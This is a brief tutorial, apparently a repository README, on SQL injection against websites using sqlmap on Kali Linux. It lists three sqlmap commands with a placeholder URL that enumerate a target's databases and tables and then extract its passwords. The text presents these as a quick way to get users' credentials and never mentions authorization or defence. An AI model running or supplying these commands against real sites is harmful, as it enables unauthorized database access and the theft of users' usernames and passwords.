# SQL-Injection
SQL injection on a website using kali linux

SQL server vulnerability will give full access to other users to get all the information  including username and passwords, with mail chat details, 
So vulnerability is the biggest  harm for the organizations.

For that we have to write just two to three commands in kali linux terminal

To get the databases
#sqlmap --url (paste the url) --dbs --risk=2 --level=2

However we can change the risk and the level according to the security

For getting the tables 
#sqlmap --url (paste the url) --tables --risk=2 --level=3

And we will get all the tables associated with the databases

For getting the passwords
#sqlmap --url (paste the url) --passwords --risk=2 --level=3 

And this will give us the passwords


